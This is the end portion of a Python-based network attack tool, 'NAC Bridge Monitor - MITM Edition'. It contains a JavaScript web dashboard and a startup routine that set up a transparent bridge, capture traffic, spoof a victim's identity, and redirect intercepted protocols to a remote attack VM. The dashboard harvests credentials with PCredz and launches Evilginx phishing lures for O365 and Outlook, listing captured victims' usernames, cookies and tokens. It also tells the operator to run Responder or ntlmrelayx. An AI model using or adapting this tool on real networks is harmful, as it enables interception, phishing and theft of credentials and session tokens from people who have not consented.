<div style="font-size:3em;margin-bottom:15px">[ ]</div>
<p>No PCredz output yet</p>
<p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p>
</div>
</div>
</div>
</div>
</div>
<script>
// Error boundary - catch all errors
window.addEventListener('error', function(e) {
    console.error('Global error:', e.message, 'at', e.filename, 'line', e.lineno);
    alert('JavaScript Error: ' + e.message + ' at line ' + e.lineno);
});

console.log('Script starting...');

let startTime=null,currentFilter='all',allLoot=[];
function showAlert(message,type="info"){
    try{
        const el=document.getElementById("alert");
        if(!el){console.error('Alert element not found');return}
        el.className="alert alert-"+type+" show";
        el.textContent=message;
        setTimeout(function(){el.classList.remove("show")},5000);
    }catch(err){
        console.error('showAlert error:',err);
        alert(message);
    }
}
function formatBytes(bytes){if(bytes===0)return"0 B";const k=1024,sizes=["B","KB","MB","GB"];const i=Math.floor(Math.log(bytes)/Math.log(k));return parseFloat((bytes/Math.pow(k,i)).toFixed(2))+" "+sizes[i]}
function formatDuration(seconds){const h=Math.floor(seconds/3600);const m=Math.floor(seconds%3600/60);const s=Math.floor(seconds%60);return h.toString().padStart(2,"0")+":"+m.toString().padStart(2,"0")+":"+s.toString().padStart(2,"0")}
function switchTab(tab){
    try{
        console.log('Switching to tab:', tab);
        document.querySelectorAll(".tab-content").forEach(el=>el.classList.remove("active"));
        document.querySelectorAll(".tab-btn").forEach(el=>el.classList.remove("active"));
        const tabEl=document.getElementById(tab+"Tab");
        if(tabEl)tabEl.classList.add("active");
        if(window.event&&window.event.target)window.event.target.classList.add("active");
        if(tab==="loot")fetchLoot();
        if(tab==="mitm")fetchStatus();
    }catch(err){
        console.error('switchTab error:',err);
        alert('Tab switch error: '+err.message);
    }
}
function updateStatus(data){
try{
const isActive=data.status==="active";
const badge=document.getElementById("statusBadge");
if(badge){
badge.className="status-badge "+(isActive?"active":"inactive");
badge.innerHTML='<span class="status-indicator '+(isActive?"active":"inactive")+'"></span><span>'+(isActive?"Active":"Inactive")+'</span>';
}
const captureInfo=document.getElementById("captureInfo");
if(captureInfo){
captureInfo.className="capture-info "+(isActive?"active":"");
}
const size=data.pcap_size||0;
const packets=data.packet_count||0;
const pcapSizeBtn=document.getElementById("btnPcapSize");
if(pcapSizeBtn){
pcapSizeBtn.textContent="PCAP Size: "+formatBytes(size);
pcapSizeBtn.disabled=!data.pcap_file;
}
if(data.mitm){
const mitmBadge=document.getElementById("mitmBadge");
if(mitmBadge){
const enabled=data.mitm.enabled;
mitmBadge.className="status-badge "+(enabled?"active":"inactive");
mitmBadge.innerHTML='<span class="status-indicator '+(enabled?"active":"inactive")+'"></span><span>'+(enabled?"Active":"Inactive")+'</span>';
}
const btnEnableMITM=document.getElementById("btnEnableMITM");
if(btnEnableMITM)btnEnableMITM.disabled=data.mitm.enabled;
const btnDisableMITM=document.getElementById("btnDisableMITM");
if(btnDisableMITM)btnDisableMITM.disabled=!data.mitm.enabled;
if(data.mitm.victim_mac){
const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="block";
const victimMac=document.getElementById("victimMac");
if(victimMac)victimMac.textContent=data.mitm.victim_mac;
const victimIP=document.getElementById("victimIP");
if(victimIP)victimIP.textContent=data.mitm.victim_ip||"Unknown";
const gatewayMac=document.getElementById("gatewayMac");
if(gatewayMac)gatewayMac.textContent=data.mitm.gateway_mac||"Unknown";
}else{
const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="none";
}
const rulesDiv=document.getElementById("activeRules");
if(rulesDiv){
if(data.mitm.active_rules&&data.mitm.active_rules.length>0){
var rulesHTML='';
for(var i=0;i<data.mitm.active_rules.length;i++){
var rule=data.mitm.active_rules[i];
rulesHTML+='<div class="rule-item"><div class="rule-info"><strong>'+rule.protocol+'</strong> port '+rule.port+' to '+rule.target_ip+' ('+rule.destination+')</div></div>';
}
rulesDiv.innerHTML=rulesHTML;
}else{
rulesDiv.innerHTML='<p style="color:#999;text-align:center;padding:20px">No active intercept rules</p>';
}
}
}
if(data.evilginx){
const evilBadge=document.getElementById("evilginxBadge");
const evilBadge2=document.getElementById("evilginxBadge2");
const running=data.evilginx.running;
const installed=data.evilginx.installed;
const sessCount=data.evilginx.sessions_count||0;
if(evilBadge)evilBadge.textContent=sessCount;
if(evilBadge2){
evilBadge2.className="status-badge "+(running?"active":"inactive");
evilBadge2.innerHTML='<span class="status-indicator '+(running?"active":"inactive")+'"></span><span>'+(running?"Running":"Inactive")+'</span>';
}
const statusCard=document.getElementById("evilginxStatusCard");
const installStatusEl=document.getElementById("evilginxInstallStatus");
const pathEl=document.getElementById("evilginxPath");
const btnInstall=document.getElementById("btnInstallEvilginx");
if(statusCard){
if(installed){
statusCard.style.borderLeftColor="#27ae60";
if(installStatusEl)installStatusEl.innerHTML='<span style="color:#27ae60">Installed</span>';
if(pathEl)pathEl.textContent=data.evilginx.install_path||'/opt/evilginx2/evilginx';
if(btnInstall)btnInstall.style.display="none";
}else{
statusCard.style.borderLeftColor="#e74c3c";
if(installStatusEl)installStatusEl.innerHTML='<span style="color:#e74c3c">Not Installed</span>';
if(pathEl)pathEl.textContent="Click below to install";
if(btnInstall)btnInstall.style.display="block";
}
}
const btnStartO365=document.getElementById("btnStartO365");
const btnStartOutlook=document.getElementById("btnStartOutlook");
const btnStopEvil=document.getElementById("btnStopEvilginx");
const evilNotInstalled=document.getElementById("evilginxNotInstalled");
const evilInfo=document.getElementById("evilginxInfo");
if(!installed){
if(btnStartO365)btnStartO365.disabled=true;
if(btnStartOutlook)btnStartOutlook.disabled=true;
if(btnStopEvil)btnStopEvil.disabled=true;
if(evilNotInstalled)evilNotInstalled.style.display="block";
if(evilInfo)evilInfo.style.display="none";
}else{
if(btnStartO365)btnStartO365.disabled=running;
if(btnStartOutlook)btnStartOutlook.disabled=running;
if(btnStopEvil)btnStopEvil.disabled=!running;
if(evilNotInstalled)evilNotInstalled.style.display="none";
if(evilInfo){
if(running&&data.evilginx.lure_url){
evilInfo.style.display="block";
const phishEl=document.getElementById("evilginxPhishlet");
const lureEl=document.getElementById("evilginxLure");
if(phishEl)phishEl.textContent=data.evilginx.phishlet||"Unknown";
if(lureEl)lureEl.textContent=data.evilginx.lure_url||"Unknown";
}else{
evilInfo.style.display="none";
}
}
}
const sessDiv=document.getElementById("evilginxSessions");
if(sessDiv){
if(data.evilginx.sessions&&data.evilginx.sessions.length>0){
var sessHTML='';
for(var i=0;i<data.evilginx.sessions.length;i++){
var s=data.evilginx.sessions[i];
sessHTML+='<div style="background:#fff;margin:10px 0;padding:15px;border-radius:8px;border-left:4px solid #28a745">';
sessHTML+='<div style="display:flex;justify-content:space-between;margin-bottom:10px">';
sessHTML+='<strong style="color:#28a745">Session #'+(i+1)+'</strong>';
sessHTML+='<span style="color:#999;font-size:.85em">'+new Date(s.timestamp).toLocaleString()+'</span>';
sessHTML+='</div>';
sessHTML+='<div style="margin:8px 0;font-size:.95em"><strong>Username:</strong> <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px">'+(s.username||'N/A')+'</code></div>';
sessHTML+='<div style="margin:8px 0;font-size:.95em"><strong>Phishlet:</strong> '+(s.phishlet||'N/A')+'</div>';
sessHTML+='<details style="margin-top:10px"><summary style="cursor:pointer;color:#0066cc">Show Cookies & Tokens</summary>';
sessHTML+='<pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">'+escapeHtml(s.cookies||'No cookies')+'</pre>';
sessHTML+='<pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">'+escapeHtml(s.tokens||'No tokens')+'</pre>';
sessHTML+='</details></div>';
}
sessDiv.innerHTML=sessHTML;
}else if(running){
sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>Waiting for victims...</p><p style="margin-top:10px;font-size:.9em">Share lure URL with targets</p></div>';
}else{
sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>No sessions captured yet</p><p style="margin-top:10px;font-size:.9em">Start Evilginx and send victims to lure URL</p></div>';
}
}
}
if(isActive){
const captureFile=document.getElementById("captureFile");
if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";
const capturePid=document.getElementById("capturePid");
if(capturePid)capturePid.textContent=data.pid||"-";
const bridgeName=document.getElementById("bridgeName");
if(bridgeName)bridgeName.textContent=data.bridge||"br0";
const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=formatBytes(size);
const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent=packets.toLocaleString()+" packets";
if(data.start_time){
if(!startTime)try{startTime=new Date(data.start_time)}catch(e){startTime=new Date}
const elapsed=Math.floor((new Date()-startTime)/1000);
const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent=formatDuration(elapsed);
}
const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=true;
const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=false;
const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=true;
const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=false;
}else{
const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=false;
const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=true;
const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=!data.pcap_file;
const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=!data.pcap_file;
startTime=null;
const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=data.pcap_size?formatBytes(data.pcap_size):"0 MB";
const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent="0 packets";
const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent="00:00:00";
}
if(data.interfaces){
const container=document.getElementById("interfaces");
if(container){
var intfHTML='';
for(var i=0;i<data.interfaces.length;i++){
var intf=data.interfaces[i];
intfHTML+='<div class="interface-card">';
intfHTML+='<div class="interface-header">';
intfHTML+='<span class="interface-name">'+intf.name+'</span>';
intfHTML+='<span class="interface-status '+(intf.state==="UP"?"up":"down")+'">'+intf.state+'</span>';
intfHTML+='</div>';
intfHTML+='<div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">'+(intf.mac||"N/A")+'</span></div>';
intfHTML+='<div class="interface-detail"><span>Role:</span><span>'+(intf.role||"N/A")+'</span></div>';
intfHTML+='</div>';
}
container.innerHTML=intfHTML;
}
}
if(data.logs&&data.logs.length>0){
const logEl=document.getElementById("logs");
if(logEl){
var logHTML='';
for(var i=0;i<data.logs.length;i++){
logHTML+='<div style="padding:2px 0">'+data.logs[i]+'</div>';
}
logEl.innerHTML=logHTML;
logEl.scrollTop=logEl.scrollHeight;
}
}
}catch(err){
console.error("Error updating status:",err);
}
}
async function analyzeNow(){const btnAnalyze=document.getElementById("btnAnalyze");if(btnAnalyze)btnAnalyze.disabled=true;showAlert("Running PCredz analysis... This may take a few minutes.","info");try{const res=await fetch("/api/analyze",{method:"POST"});const data=await res.json();if(data.success){showAlert("Analysis complete! Check output below.","success");fetchLoot()}else{showAlert("Analysis failed: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}finally{if(btnAnalyze)btnAnalyze.disabled=false}}
async function deletePCAP(){if(confirm("Delete current PCAP file? This cannot be undone!")){try{const res=await fetch("/api/delete_pcap",{method:"POST"});const data=await res.json();if(data.success){showAlert("PCAP deleted","success");fetchStatus();fetchLoot()}else{showAlert("Failed to delete PCAP: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
async function fetchStatus(){try{const res=await fetch("/api/status");const data=await res.json();updateStatus(data)}catch(err){console.error("Failed to fetch status:",err);setTimeout(fetchStatus,5000)}}
async function fetchLoot(){try{const res=await fetch("/api/loot");const data=await res.json();const outputEl=document.getElementById("lootOutput");if(outputEl){if(data.has_output&&data.raw_output){outputEl.innerHTML='<pre style="margin:0;color:#0f0;font-family:monospace;font-size:.9em">'+escapeHtml(data.raw_output)+'</pre>';const badge=document.getElementById("lootBadge");if(badge)badge.textContent="OK"}else{outputEl.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>No PCredz output yet</p><p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p></div>';const badge=document.getElementById("lootBadge");if(badge)badge.textContent="0"}}}catch(err){console.error("Failed to fetch loot:",err)}}
function escapeHtml(text){const div=document.createElement('div');div.textContent=text;return div.innerHTML}
async function exportLoot(){try{const res=await fetch("/api/loot");const data=await res.json();if(data.has_output){window.location.href="/api/loot/export"}else{showAlert("No output to export yet","info")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function clearLoot(){if(confirm("Clear all captured credentials?")){try{const res=await fetch("/api/loot/clear",{method:"POST"});const data=await res.json();if(data.success){showAlert("Loot cleared","success");fetchLoot()}else{showAlert("Failed to clear loot","error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
async function startCapture(){document.getElementById("btnStart").disabled=true;showAlert("Starting packet capture...","info");try{const res=await fetch("/api/start",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture started!","success");setTimeout(fetchStatus,2000);setTimeout(fetchLoot,3000)}else{showAlert("Failed to start. Check logs.","error");document.getElementById("btnStart").disabled=false}}catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStart").disabled=false}}
async function stopCapture(){if(confirm("Stop capture? Bridge will remain active.")){document.getElementById("btnStop").disabled=true;showAlert("Stopping capture...","info");try{const res=await fetch("/api/stop",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture stopped!","success")}else{showAlert("Failed to stop","error")}setTimeout(fetchStatus,3000);setTimeout(fetchLoot,4000)}catch(err){showAlert("Error: "+err.message,"error")}}}
async function downloadPCAP(){try{const res=await fetch("/api/status");const data=await res.json();if(data.pcap_file){window.location.href="/api/download?file="+encodeURIComponent(data.pcap_file)}else{showAlert("No file","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function enableMITM(){const remoteIP=document.getElementById("remoteIP").value.trim();const msg=remoteIP?"Enable MITM and route to "+remoteIP+"?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Route intercepted traffic to remote VM":"Enable MITM (local mode)?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Intercept traffic locally";if(!confirm(msg))return;const btnEnableMITM=document.getElementById("btnEnableMITM");if(btnEnableMITM)btnEnableMITM.disabled=true;showAlert("Enabling MITM... Learning victim (30s)","info");try{const body=remoteIP?JSON.stringify({remote_ip:remoteIP}):'{}';const res=await fetch("/api/mitm/enable",{method:"POST",headers:{"Content-Type":"application/json"},body:body});const data=await res.json();if(data.success){showAlert("MITM enabled! Victim identified.","success");setTimeout(fetchStatus,1000)}else{showAlert("MITM failed: "+(data.error||"Unknown error"),"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}catch(err){showAlert("Error: "+err.message,"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}
async function disableMITM(){if(!confirm("Disable MITM and cleanup all rules?"))return;showAlert("Disabling MITM...","info");try{const res=await fetch("/api/mitm/disable",{method:"POST"});const data=await res.json();if(data.success){showAlert("MITM disabled","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}
async function interceptCategory(category){const destination=document.getElementById("remoteIP").value.trim()?'remote':'local';const target=destination==='remote'?document.getElementById("remoteIP").value:'bridge IP';if(!confirm("Intercept "+category+" traffic?\n\nDestination: "+target))return;showAlert("Adding "+category+" intercept rules...","info");try{const res=await fetch("/api/mitm/intercept",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({category:category,destination:destination})});const data=await res.json();if(data.success){showAlert(category+" interception enabled ("+data.rules_added+" rules)","success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to add rules","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function clearRules(){if(!confirm("Remove all intercept rules?"))return;try{const res=await fetch("/api/mitm/clear_rules",{method:"POST"});if(res.ok){showAlert("Rules cleared","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}

async function startEvilginx(phishlet){const domain=document.getElementById("evilginxDomain").value.trim();const msg=domain?"Start Evilginx with "+phishlet+" phishlet using domain "+domain+"?":"Start Evilginx with "+phishlet+" phishlet using default domain?";if(!confirm(msg))return;document.getElementById("btnStartO365").disabled=true;document.getElementById("btnStartOutlook").disabled=true;showAlert("Starting Evilginx ("+phishlet+")...","info");try{const body={phishlet:phishlet};if(domain)body.domain=domain;const res=await fetch("/api/evilginx/start",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});const data=await res.json();if(data.success){showAlert("Evilginx started! Lure: "+data.lure_url,"success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to start: "+(data.error||"Unknown error"),"error");document.getElementById("btnStartO365").disabled=false;document.getElementById("btnStartOutlook").disabled=false}}catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStartO365").disabled=false;document.getElementById("btnStartOutlook").disabled=false}}

async function stopEvilginx(){if(!confirm("Stop Evilginx? Captured sessions will be saved."))return;showAlert("Stopping Evilginx...","info");try{const res=await fetch("/api/evilginx/stop",{method:"POST"});const data=await res.json();if(data.success){showAlert("Evilginx stopped","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}

async function clearSessions(){if(!confirm("Clear all captured sessions?"))return;try{const res=await fetch("/api/evilginx/clear_sessions",{method:"POST"});if(res.ok){showAlert("Sessions cleared","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}

function exportSessions(){window.location.href="/api/evilginx/sessions"}

async function installEvilginx(){
if(!confirm("Install Evilginx2?\n\nThis will:\n- Install Go compiler\n- Clone Evilginx2 repository\n- Build from source\n- Configure permissions\n\nThis may take 5-10 minutes."))return;
const btn=document.getElementById("btnInstallEvilginx");
if(btn){
btn.disabled=true;
btn.textContent="Installing...";
}
showAlert("Installing Evilginx2... This may take several minutes. Check logs for progress.","info");
try{
const res=await fetch("/api/evilginx/install",{method:"POST"});
const data=await res.json();
if(data.success){
showAlert("Evilginx2 installed successfully! Path: "+data.path,"success");
setTimeout(fetchStatus,2000);
}else{
showAlert("Installation failed: "+(data.error||"Unknown error"),"error");
if(btn){
btn.disabled=false;
btn.textContent="Install Evilginx";
}
}
}catch(err){
showAlert("Installation error: "+err.message,"error");
if(btn){
btn.disabled=false;
btn.textContent="Install Evilginx";
}
}
}

// Wait for DOM to be fully loaded before attaching event listeners
console.log('Setting up DOMContentLoaded handler');
document.addEventListener('DOMContentLoaded',function(){
try{
console.log('DOM Content Loaded - attaching event listeners');
const btnStart=document.getElementById("btnStart");
const btnStop=document.getElementById("btnStop");
const btnDownload=document.getElementById("btnDownload");
const btnDelete=document.getElementById("btnDelete");

console.log('Buttons found:', {start:!!btnStart, stop:!!btnStop, download:!!btnDownload, delete:!!btnDelete});

if(btnStart){
btnStart.addEventListener("click",startCapture);
console.log('Start button listener attached');
}
if(btnStop){
btnStop.addEventListener("click",stopCapture);
console.log('Stop button listener attached');
}
if(btnDownload){
btnDownload.addEventListener("click",downloadPCAP);
console.log('Download button listener attached');
}
if(btnDelete){
btnDelete.addEventListener("click",deletePCAP);
console.log('Delete button listener attached');
}

console.log('Fetching initial status...');
fetchStatus();
setInterval(fetchStatus,3000);
console.log('Setup complete!');
}catch(err){
console.error('DOMContentLoaded error:',err);
alert('Initialization error: '+err.message);
}
});
console.log('Script loaded, waiting for DOM...');
</script>
</body>
</html>'''

# ============================================================================
# MAIN
# ============================================================================

def main():
    global shutdown_in_progress

    print("""
╔═══════════════════════════════════════════════════════════╗
║       NAC Bridge Monitor - MITM Edition                   ║
║       Transparent Bridge + Active Interception            ║
╚═══════════════════════════════════════════════════════════╝
""")

    if os.geteuid() != 0:
        print("❌ Must run as root: sudo python3 nac-tap.py")
        return 1

    # Check dependencies
    missing = []
    for tool in ['tcpdump', 'ip', 'bridge', 'ethtool', 'iptables', 'ebtables']:
        result = run_cmd(['which', tool])
        if not result or result.returncode != 0:
            missing.append(tool)

    if missing:
        print(f"❌ Missing tools: {', '.join(missing)}")
        print(f"   Install: sudo apt install {' '.join(missing)}")
        return 1

    if not os.path.exists(CONFIG['PCREDZ_PATH']):
        print("⚠️  PCredz not found - credential harvesting disabled")
        print("   Install: sudo bash install-nac-monitor.sh")
        print()

    os.makedirs(CONFIG['PCAP_DIR'], exist_ok=True)

    bridge_manager = BridgeManager()
    NACWebHandler.bridge_manager = bridge_manager

    log("NAC Bridge Monitor starting...")

    # Setup bridge at startup
    if CONFIG['TRANSPARENT_MODE']:
        log("Setting up transparent bridge...")
        if not bridge_manager.setup_transparent_bridge():
            log("Failed to setup bridge", 'WARNING')

    # Signal handlers
    def signal_handler(signum, frame):
        global shutdown_in_progress
        if shutdown_in_progress:
            return
        shutdown_in_progress = True

        log("Shutdown signal received...")
        with capture_lock:
            if bridge_manager.tcpdump_process:
                bridge_manager.stop_capture()
            if bridge_manager.mitm_manager.enabled:
                bridge_manager.mitm_manager.cleanup()
            if bridge_manager.evilginx_manager and bridge_manager.evilginx_manager.running:
                bridge_manager.evilginx_manager.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Start web server
    server_address = ('', CONFIG['WEB_PORT'])
    httpd = HTTPServer(server_address, NACWebHandler)

    print(f"""
✅ Server started!

Web Interface:
  http://localhost:{CONFIG['WEB_PORT']}
  http://<device-ip>:{CONFIG['WEB_PORT']}

Architecture:
  Client ↔ [eth0 ↔ br0 ↔ eth1] ↔ Switch
               └── tcpdump + MITM interception

Features:
  🔐 Transparent Mode: Bridge always active (802.1X compatible)
  🎭 MITM Mode: Learn victim, spoof identity, intercept protocols
  📡 Remote Relay: Send intercepted traffic to external attack VM
  🎣 Credential Analysis: PCredz integration

MITM Usage:
  1. Start capture (Status tab)
  2. Enable MITM (MITM tab) - will learn victim MAC/IP
  3. Add intercept rules for protocols you want
  4. Run Responder/ntlmrelayx on bridge IP (10.200.66.1)
  5. Or set Remote IP and route to external Kali VM

Captures: {CONFIG['PCAP_DIR']}
Logs:     {CONFIG['LOGFILE']}

Press Ctrl+C to stop
""")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        if not shutdown_in_progress:
            log("Shutting down...")
            with capture_lock:
                bridge_manager.stop_capture()
                if bridge_manager.mitm_manager.enabled:
                    bridge_manager.mitm_manager.cleanup()
                if bridge_manager.evilginx_manager and bridge_manager.evilginx_manager.running:
                    bridge_manager.evilginx_manager.stop()
        httpd.shutdown()
        return 0

if __name__ == '__main__':
    sys.exit(main())
